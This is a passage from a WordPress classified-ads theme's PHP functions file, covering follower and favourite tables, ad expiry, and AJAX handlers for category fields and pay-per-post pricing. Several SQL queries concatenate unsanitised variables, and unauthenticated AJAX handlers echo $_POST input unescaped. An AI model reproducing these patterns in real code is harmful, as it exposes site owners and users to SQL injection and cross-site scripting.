								<input type="radio" name="" value="checkbox" class='field_type field_type_<?php echo $user_id; ?>'>Checkbox<br />
								<input type="radio" name="" value="dropdown" class='field_type field_type_<?php echo $user_id; ?>'>Dropdown<br />
							</td>
							<td class="eratd3">
								 <input style="display:none"  type='text' id='option_<?php echo $user_id ?>' name='' value='' class='options_c options_c_<?php echo $user_id; ?>' placeholder="Add Options with Comma , separated Example: One,Two,Three">
							</td>
							<td class="eratd4">
								<button name="button_del_badge" type="button" class="button-secondary button_del_badge_<?php echo $user_id; ?>">Delete</button>
								 
							</td>
						</tr>
					</table>
				</div>
            </div>
			<table class="maintable">
				<tr class="custcathead">
					<th class="eratd"><span class="text ingredient-title"><?php _e( 'Custom field title', 'classify' ); ?></span></th>
					<th class="eratd2"><span class="text ingredient-title"><?php _e( 'Input Type:', 'classify' ); ?></span></th>
					<th class="eratd3"></th>
					<th class="eratd4"><span class="text ingredient-title"><?php _e( 'Delete', 'classify' ); ?></span></th>
				</tr>
			</table>
            <fieldset class="input-full-width">
              <button type="button" name="submit_add_badge" id='submit_add_badge_<?php echo $user_id; ?>' value="add" class="button-secondary">Add new custom field</button>
            </fieldset>
            <span class="submit"><input name="save<?php echo $user_id; ?>" type="submit" class="button-primary" value="Save changes" /></span>
            <script>
              // Add Badge

              jQuery('#template_badge_criterion_<?php echo $user_id; ?>').hide();
              jQuery('#submit_add_badge_<?php echo $user_id; ?>').on('click', function() {    
                $newItem = jQuery('#template_badge_criterion_<?php echo $user_id; ?> .badge_item').clone().appendTo('#badge_criteria_<?php echo $user_id; ?>').show();
                if ($newItem.prev('.badge_item').size() == 1) {
                  var id = parseInt($newItem.prev('.badge_item').attr('id')) + 1;
                } else {
                  var id = 0; 
                }
                $newItem.attr('id', id);

                var nameText = 'wpcrown_category_custom_field_option_<?php echo $user_id; ?>[' + id + '][0]';
                $newItem.find('.badge_name').attr('id', nameText).attr('name', nameText);
				
				var nameText2 = 'wpcrown_category_custom_field_type_<?php echo $user_id; ?>[' + id + '][1]';
							$newItem.find('.field_type').attr('id', nameText2).attr('name', nameText2);
							
				var nameText3 = 'wpcrown_category_custom_field_type_<?php echo $user_id; ?>[' + id + '][2]';
							$newItem.find('.options_c').attr('name', nameText3);

                //event handler for newly created element
                jQuery('.button_del_badge_<?php echo $user_id; ?>').on('click', function () {
                  jQuery(this).closest('.badge_item').remove();
                });

              });
              
              // Delete Ingredient
              jQuery('.button_del_badge_<?php echo $user_id; ?>').on('click', function() {
                jQuery(this).closest('.badge_item').remove();
              });

				// Delete Ingredient
			   jQuery( document ).ready(function() {
					jQuery(document).on('click', '.field_type_<?php echo $user_id; ?>', function(e) {
					var val = jQuery(this).val();
						if(val == 'dropdown'){
							jQuery(this).parent().next('td').find('#option_<?php echo $user_id ?>').css('display','block');
						}else{
							jQuery(this).parent().next('td').find('#option_<?php echo $user_id ?>').css('display','none');
						}
					});
				});
            </script>
          </div>
      <?php } ?>
    </div>
  <input type="hidden" name="action" value="savecat" />
  </form>
  <?php
}
function classify_the_titlesmall($before = '', $after = '', $echo = true, $length = false){ 
	$title = get_the_title();
	if ( $length && is_numeric($length) ) {
		$title = substr( $title, 0, $length );
	}
	if ( strlen($title)> 0 ) {
		$title = apply_filters('classify_the_titlesmall', $before . $title . $after, $before, $after);
		if ( $echo )
			echo $title;
		else
			return $title;
	}
}
add_action('template_redirect', 'add_scripts');
function add_scripts() {
    if (is_singular()) {
      add_thickbox(); 
    }
}
//Register tag cloud filter callback

add_filter('widget_tag_cloud_args', 'classify_tag_widget_limit');
//Limit number of tags inside widget
function classify_tag_widget_limit($args){
	global $redux_demo;
	 $tagsnumber= $redux_demo['tags_limit']; 
	//Check if taxonomy option inside widget is set to tags
	if(isset($args['taxonomy']) && $args['taxonomy'] == 'post_tag'){
	  $args['number'] = $tagsnumber; //Limit number of tags
	}
	return $args;
}
function classify_get_attachment_id_from_src($image_src){
    global $wpdb;
    $query = "SELECT ID FROM {$wpdb->posts} WHERE guid='$image_src'";
    $id = $wpdb->get_var($query);
    return $id;
}
function classify_add_media_upload_scripts() {
    if ( is_admin() ) {
         return;
       }
    wp_enqueue_media();
}
add_action('wp_enqueue_scripts', 'classify_add_media_upload_scripts');

function classify_get_avatar_url($author_id, $size){
    $get_avatar = get_avatar( $author_id, $size );
    preg_match("/src='(.*?)'/i", $get_avatar, $matches);
    return ( $matches[1] );
}
function classify_allow_users_uploads() {
	$subscriber = get_role('subscriber');
	$subscriber->add_cap('upload_files');
	$subscriber->add_cap('delete_published_posts');

	$contributor = get_role('contributor');
	$contributor->add_cap('upload_files');
	$contributor->add_cap('delete_published_posts');
}

add_action('admin_init', 'classify_allow_users_uploads');
if ( current_user_can('subscriber') || current_user_can('contributor') && !current_user_can('upload_files') ) {
    add_action('admin_init', 'classify_allow_contributor_uploads');
}
function classify_allow_contributor_uploads() {
    $subscriber = get_role('subscriber');
    $subscriber->add_cap('upload_files');
	
	$contributor = get_role('contributor');
    $contributor->add_cap('upload_files');
}
add_filter( 'posts_where', 'classify_devplus_attachments_wpquery_where' );
function classify_devplus_attachments_wpquery_where( $where ){
    global $current_user;
    if ( !current_user_can( 'administrator' ) ) {
		if( is_user_logged_in() ){
			// we spreken over een ingelogde user
			if( isset( $_POST['action'] ) ){
				// library query
				if( $_POST['action'] == 'query-attachments' ){
					$where .= ' AND post_author='.$current_user->data->ID;
				}
			}
		}
	}
    return $where;
}
add_action( 'wp', 'classify_ad_expiry_schedule' );
/**
 * On an early action hook, check if the hook is scheduled - if not, schedule it.
 */
function classify_ad_expiry_schedule() {
	if ( ! wp_next_scheduled( 'classify_ad_expiry_event' ) ) {
		wp_schedule_event( time(), 'hourly', 'classify_ad_expiry_event');
	}
}
add_action( 'classify_ad_expiry_event', 'classify_ad_expiry' );
/**
 * On the scheduled action hook, run a function.
 */
function classify_ad_expiry() {
	global $wpdb;
	global $redux_demo;
	$daystogo = '';
	if (!empty($redux_demo['ad_expiry'])){
		$daystogo = $redux_demo['ad_expiry'];	
		$sql =
		"UPDATE {$wpdb->posts}
		SET post_status = 'trash'
		WHERE (post_type = 'post' AND post_status = 'publish')
		AND DATEDIFF(NOW(), post_date) > %d";
		$wpdb->query($wpdb->prepare( $sql, $daystogo ));
	}
}
function classify_authors_tbl_create() {
    global $wpdb;
    $sql2 = ("CREATE TABLE IF NOT EXISTS {$wpdb->prefix}author_followers (
        id int(11) NOT NULL AUTO_INCREMENT,
        author_id int(11) NOT NULL,
        follower_id int(11) NOT NULL,
        PRIMARY KEY (id)
    ) ENGINE=InnoDB AUTO_INCREMENT=1;");
	$wpdb->query($sql2);
    $sql = ("CREATE TABLE IF NOT EXISTS {$wpdb->prefix}author_favorite (
        id int(11) NOT NULL AUTO_INCREMENT,
        author_id int(11) NOT NULL,
        post_id int(11) NOT NULL,
        PRIMARY KEY (id)
    ) ENGINE=InnoDB AUTO_INCREMENT=1;");
 $wpdb->query($sql);
}
add_action( 'init', 'classify_authors_tbl_create', 1 );

function classify_authors_insert($author_id, $follower_id) {
    global $wpdb;
	$author_insert = ("INSERT into {$wpdb->prefix}author_followers (author_id,follower_id)value('".$author_id."','".$follower_id."')");
  $wpdb->query($author_insert);
}
function classify_authors_unfollow($author_id, $follower_id) {
    global $wpdb;
	$author_del = ("DELETE from {$wpdb->prefix}author_followers WHERE author_id = $author_id AND follower_id = $follower_id ");
  $wpdb->query($author_del);
}
function classify_authors_follower_check($author_id, $follower_id) {
	global $wpdb;
	$results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_followers WHERE follower_id = $follower_id AND author_id = $author_id", OBJECT );
    if(empty($results)){
		?>
		<form method="post" class="follower">
			<input type="hidden" name="author_id" value="<?php echo $author_id; ?>"/>
			<input type="hidden" name="follower_id" value="<?php echo $follower_id; ?>"/>
			<button type="submit" name="follower" class="btn btn-primary">
				<i class="fa fa-user-plus classify_leftright"></i>
				<?php _e( 'Follow', 'classify' ); ?>
			</button>
		</form>
		<div class="clearfix"></div>
		<?php
	}else{
		?>
		<form method="post" class="unfollow">
			<input type="hidden" name="author_id" value="<?php echo $author_id; ?>"/>
			<input type="hidden" name="follower_id" value="<?php echo $follower_id; ?>"/>
			<button type="submit" name="unfollow" class="btn btn-danger">
				<i class="fa fa-user-times classify_leftright"></i>
				<?php _e( 'Unfollow', 'classify' ); ?>
			</button>
		</form>
		<div class="clearfix"></div>
		<?php
	}
}
function classify_authors_all_follower($author_id) {
	global $wpdb;
	$results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_followers WHERE author_id = $author_id", OBJECT );
	$results2 = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_followers WHERE follower_id = $author_id", OBJECT );
	$followcounter = count($results);
	$followingcounter = count($results2);
	?>
	<div class="clearfix"></div>
	<div class="followers clearfix">
		<h4 class="inner-heading"><?php _e( 'Followers', 'classify' ); ?>&nbsp;<?php echo $followcounter; ?></h4>
		<?php
		if(!empty($results)){
			$avatar = $results['0']->follower_id;
			echo '<div class="follower-avatar">';
			echo get_avatar($avatar, 70);
			echo '</div>';
		}
		?>
	</div>
	<div class="following">
		<h4 class="inner-heading"><?php _e( 'Following', 'classify' ); ?>&nbsp;<?php echo $followingcounter; ?></h4>
		<?php
		if(!empty($results2)){
			$avatar = $results2['0']->author_id;
			echo '<div class="follower-avatar">';
			echo get_avatar($avatar, 70);
			echo '</div>';
		}
		?>
	</div>
	<?php
}

function classify_favorite_insert($author_id, $post_id){
    global $wpdb;	
	$author_insert = ("INSERT into {$wpdb->prefix}author_favorite (author_id,post_id)value('".$author_id."','".$post_id."')");
  $wpdb->query($author_insert);
}
function classify_authors_unfavorite($author_id, $post_id) {
    global $wpdb;	
	$author_del = ("DELETE from {$wpdb->prefix}author_favorite WHERE author_id = $author_id AND post_id = $post_id ");
  $wpdb->query($author_del);
}
function classify_authors_favorite_check($author_id, $post_id) {
	global $wpdb;
	$results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_favorite WHERE post_id = $post_id AND author_id = $author_id", OBJECT );
    if(empty($results)){?>
		<form method="post" class="fav-form clearfix">
			<input type="hidden" name="author_id" value="<?php echo $author_id; ?>"/>
			<input type="hidden" name="post_id" value="<?php echo $post_id; ?>"/>
			<button type="submit" name="favorite" class="btn btn-info">
				<i class="fa fa-heart classify_leftright"></i>
				<?php _e( 'Add to Favourite', 'classify' ); ?>
			</button>
		</form>
		<?php
	}else{
		$all_fav = $wpdb->get_results("SELECT `post_id` FROM $wpdb->postmeta WHERE `meta_key` ='_wp_page_template' AND `meta_value` = 'template-favorite.php' ", ARRAY_A);
		$all_fav_permalink = get_permalink($all_fav[0]['post_id']);
		?>
		<div class="browse-favourite">
			<a class="btn btn-primary" href="<?php echo $all_fav_permalink; ?>">
			<i class="fa fa-heart favorite-i classify_leftright"></i>
			<?php _e( 'Browse Favourites', 'classify' ); ?>
			</a>
		</div>
		<?php
	}
}
function classify_authors_favorite_remove($author_id, $post_id) {
	global $wpdb;
	$results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_favorite WHERE post_id = $post_id AND author_id = $author_id", OBJECT );
    if(!empty($results)){
		?>
		<form method="post" class="unfavorite">
			<input type="hidden" name="author_id" value="<?php echo $author_id; ?>"/>
			<input type="hidden" name="post_id" value="<?php echo $post_id; ?>"/>
			<button class="btn btn-danger" name="unfavorite">
				<i class="fa fa-heartbeat classify_leftright"></i>
				<?php _e( 'Remove from favorite', 'classify' ); ?>
			</button>
		</form>
		<?php
	}
}
function classify_authors_all_favorite($author_id) {
	global $wpdb;
	$postids = $wpdb->get_col( $wpdb->prepare( "SELECT post_id FROM {$wpdb->prefix}author_favorite WHERE author_id = $author_id", OBJECT ));
	foreach ($postids as $v2) {
        $postids[] = $v2;
    }
		return $postids;
}
add_action( 'after_setup_theme', 'classify_admin_featuredPlan' );
function classify_admin_featuredPlan() {
	global $wpdb;
	$adminPlanSql = ("CREATE TABLE IF NOT EXISTS {$wpdb->prefix}classify_plans(
		id int(11) NOT NULL AUTO_INCREMENT,
		product_id TEXT ,
		user_id TEXT NOT NULL ,
		plan_name TEXT NOT NULL ,
		price FLOAT UNSIGNED NOT NULL ,
		featured_ads TEXT ,
		regular_ads TEXT ,
		days TEXT NOT NULL ,
		date TEXT NOT NULL ,
		status TEXT NOT NULL ,
		featured_used TEXT NOT NULL ,
		regular_used TEXT NOT NULL ,
		created INT( 4 ) UNSIGNED NOT NULL,
        PRIMARY KEY (id)
    ) ENGINE=InnoDB AUTO_INCREMENT=1;");
	$wpdb->query($adminPlanSql);	
	$price_plan_information = array(
		'id' =>'',
		'product_id' => '',
		'user_id' => '1',
		'plan_name' => 'Unlimited Ads',
		'price' => '',
		'featured_ads' => 'unlimited',
		'regular_ads' => 'unlimited',
		'days' => 'unlimited',
		'status' => "complete",
		'featured_used' => "0",
		'regular_used' => "0",
		'created' => time()
	);	
	$insert_format = array('%d', '%d', '%d', '%s','%d', '%s', '%s', '%s', '%s', '%s', '%s');
	$tablename = $wpdb->prefix . 'classify_plans';
	$result = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}classify_plans WHERE user_id = 1 ORDER BY id DESC" );

	if (empty($result )){
		$wpdb->insert($tablename, $price_plan_information, $insert_format);
	}
}
add_action('wp_head','classify_ajaxURL');
function classify_ajaxURL(){ 
?>
	<script type="text/javascript">
	var ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>';
	</script>
<?php 
}
/* Fix nextend facebook connect doesn't remove cookie after logout */
if (!function_exists('classify_clear_nextend_cookie')) {
    function classify_clear_nextend_cookie(){
        setcookie( 'nextend_uniqid',' ', time() - YEAR_IN_SECONDS, '/', COOKIE_DOMAIN );
        return 0;
    }
}
add_action('clear_auth_cookie', 'classify_clear_nextend_cookie');
/* Fix nextend facebook connect*/
/*Remove Notification from redux framework */
function classifyRemoveReduxDemoModeLink() {
    if ( class_exists('ReduxFrameworkPlugin') ) {
        remove_filter( 'plugin_row_meta', array( ReduxFrameworkPlugin::get_instance(), 'plugin_metalinks'), null, 2 );
    }
    if ( class_exists('ReduxFrameworkPlugin') ) {
        remove_action('admin_notices', array( ReduxFrameworkPlugin::get_instance(), 'admin_notices' ) );    
    }
}
add_action('init', 'classifyRemoveReduxDemoModeLink');
/*Remove Notification from redux framework */
//Remove images when delete post//
add_action('before_delete_post', ' classify_delete_post_children');
add_action('trash_post', 'classify_delete_post_children');
function classify_delete_post_children($post_id){
	global $wpdb;
	$child_atts = $wpdb->get_col("SELECT ID FROM {$wpdb->posts} WHERE post_parent = $post_id AND post_type = 'attachment'");
	foreach ( $child_atts as $id ){
		wp_delete_attachment($id);
	}
}
/*Pay Per categories posts*/
add_action('wp_ajax_classify_pay_per_post_id', 'classify_pay_per_post_id');
add_action('wp_ajax_nopriv_classify_pay_per_post_id', 'classify_pay_per_post_id');//for users that are not logged in.
function classify_pay_per_post_id(){
	if(isset($_POST['catID'])){
		$cat_pay_per_post = '';
		$displayfeaturedtxt = esc_html__( 'Feature this ad only in ', 'classify' );
		$categoryID = $_POST['catID'];
		$categoryData = get_terms('category', array(
				'hide_empty' => 0,				
				'order'=> 'ASC',
				'include'=> $categoryID,
			)	
		);		
		foreach($categoryData as $category){
			$tag = $category->term_id;
			$classifyCatFields = get_option(MY_CATEGORY_FIELDS);
			$cat_pay_per_post = $classifyCatFields[$tag]['cat_pay_per_post'];
			$days_to_expire = $classifyCatFields[$tag]['days_to_expire'];
		}
		global $woocommerce;
		if(function_exists('wc_get_product')){
			$_product = wc_get_product($cat_pay_per_post);
			$price = $_product->get_price();
		}else{
			die();
		}
		$currency = classify_currency_sign();		
		$htmlResult = '<p>'.$displayfeaturedtxt.$currency.$price.'</p><input type="hidden" value="'.$cat_pay_per_post.'" name="pay_per_post_product_id"><input type="hidden" value="'.$days_to_expire.'" name="days_to_expire">';
		echo $htmlResult;
	}
	die();
}
/*Pay Per categories posts*/
//Categories Custom Fields Ajax//
add_action( 'wp_ajax_classify_Get_Custom_Fields', 'classify_Get_Custom_Fields' );
add_action( 'wp_ajax_nopriv_classify_Get_Custom_Fields', 'classify_Get_Custom_Fields' );
function classify_Get_Custom_Fields(){	
	$categoryID = $_POST['classify_Cat_ID'];
	$categoryName = get_cat_name( $categoryID );
	$cat_data = get_option(MY_CATEGORY_FIELDS);
	$thisCategoryOptions = $cat_data[$categoryID];
	if(isset($thisCategoryOptions)){
		$optionData = array();
		$selectFeature = esc_html__( 'Select Feature', 'classify' );
		$thisCategoryFields = $thisCategoryOptions['category_custom_fields'];		
		$thisCategoryType = $thisCategoryOptions['category_custom_fields_type'];
		echo '<div class="form-main-section extra-fields wrap-content cat-'.$categoryID.'">';
		$counter = "";
		for($counter = 0; $counter < (count($thisCategoryFields)); $counter++){			
		}
		if($counter > 0){
			echo '<h4 class="text-uppercase border-bottom">'.esc_html__('Extra Fields For', 'classify').'&nbsp;'.$categoryName.':</h4>';
		}
		for($i = 0; $i < (count($thisCategoryFields)); $i++){ 
			if($thisCategoryType[$i][1] == 'text'){
				echo '<div class="col-sm-12 padding-control cat-'.$categoryID.'"><span class="fa fa-bolt form-control-feedback"></span><input type="hidden" class="custom_field" id="custom_field['.$i.'][0]" name="'.$categoryID.'custom_field['.$i.'][0]" value="'.$thisCategoryFields[$i][0].'" size="12"><input type="text" class="form-control form-control-md" id="custom_field['.$i.'][1]" name="'.$categoryID.'custom_field['.$i.'][1]" placeholder="'.$thisCategoryFields[$i][0].'" size="12"></div>';
			}
		}
		for($i = 0; $i < (count($thisCategoryFields)); $i++){			
			if($thisCategoryType[$i][1] == 'dropdown'){
				$options = $thisCategoryType[$i][2];
				$optionsarray = explode(',',$options);
				foreach($optionsarray as $option){
					$optionData[$i] .= '<option value="'.$option.'">'.$option.'</option>';
				}				
				echo '<div class="col-sm-12 padding-control form-group cat-'.$categoryID.'"><span class="fa fa-bars form-control-feedback"></span><input type="hidden" class="custom_field" id="custom_field['.$i.'][0]" name="'.$categoryID.'custom_field['.$i.'][0]" value="'.$thisCategoryFields[$i][0].'" size="12"><input type="hidden" class="custom_field" id="custom_field['.$i.'][2]" name="'.$categoryID.'custom_field['.$i.'][2]" value="'.$thisCategoryType[$i][1].'" size="12"><select class="form-control form-control-md" id="custom_field['.$i.'][1]" name="'.$categoryID.'custom_field['.$i.'][1]"><option>'.$thisCategoryFields[$i][0].'</option>'.$optionData[$i].'</select></div>';
			}			
		}
		for($i = 0; $i < (count($thisCategoryFields)); $i++){
			if($thisCategoryType[$i][1] == 'checkbox'){
				
				echo '<div class="col-sm-12 form-group padding-control form__check cat-'.$categoryID.'"><p class="featurehide featurehide'.$i.'">'.$selectFeature.'</p><input type="hidden" class="custom_field" id="custom_field['.$i.'][0]" name="'.$categoryID.'custom_field['.$i.'][0]" value="'.$thisCategoryFields[$i][0].'" size="12"><input type="hidden" class="custom_field" id="custom_field['.$i.'][2]" name="'.$categoryID.'custom_field['.$i.'][2]" value="'.$thisCategoryType[$i][1].'" size="12"><div class="checkbox"><label for="'.$categoryID.'custom_field['.$i.'][1]" class="newcehcklabel"><input type="checkbox" class="custom_field custom_field_visible input-textarea newcehckbox" id="'.$categoryID.'custom_field['.$i.'][1]" name="'.$categoryID.'custom_field['.$i.'][1]">'.$thisCategoryFields[$i][0].'</label></div></div>';
			}
		}
		echo '</div>';
	}
	die();
	
}
//Categories Custom Fields Ajax//
//Classify Ads Type//
if (!function_exists('classify_ads_type_display')){
	function classify_ads_type_display($text){		
		$string = str_replace(' ', '', $text);		
		if($string == 'buy'){
			$returnVal = esc_html__( 'Wanted', 'classify' );
		}elseif($string == 'sell'){
			$returnVal = esc_html__( 'For Sale', 'classify' );
		}elseif($string == 'sold'){
			$returnVal = esc_html__( 'Sold', 'classify' );
		}elseif($string == 'rent'){
			$returnVal = esc_html__( 'For Rent', 'classify' );
		}elseif($string == 'hire'){
			$returnVal = esc_html__( 'For Hire', 'classify' );
		}else{
			$returnVal = '';
		}		
		return $returnVal;
		
	}
}
//Get Country Name by Country Id//
if (!function_exists('classify_get_country_by_Id')) {
	function classify_get_country_by_Id($countryID){		
		if (is_numeric($countryID)){
			$countryArgs = array(
				'post__in' => array($countryID),
				'post_per_page' => -1,
				'post_type' => 'countries',
			);
			$countryPosts = get_posts($countryArgs);
			foreach ($countryPosts as $p){	
				$countryName = $p->post_title;
			}
		}else{
			$countryName = $countryID;
		}
		return $countryName;
	}
}
//Get Page Permalink by template name//
if (!function_exists('classify_page_permalinks')) {
	function classify_page_permalinks($templatename){
		$url = '';
		$classifyPages = get_pages(
			array(
				'meta_key' => '_wp_page_template',
				'meta_value' => $templatename,
				'suppress_filters' => true,
			)
		);
		if(!empty($classifyPages)){
			$pageID = $classifyPages[0]->ID;
			$url = get_permalink($pageID);
		}
		return $url;
	}
}
if (!function_exists('classify_author_pagination')) {
	function classify_author_pagination( $query ) {
		if ( $query->is_author() && $query->is_main_query() ){
			$query->set( 'posts_per_page', 2 );
			$query->set( 'post_type', 'post' );
		}
		if ( $query->is_category()){
			$query->set( 'post_type', 'post' );
			$query->set( 'posts_per_page', 9 );
		}
	}
	add_action( 'pre_get_posts', 'classify_author_pagination' );
}
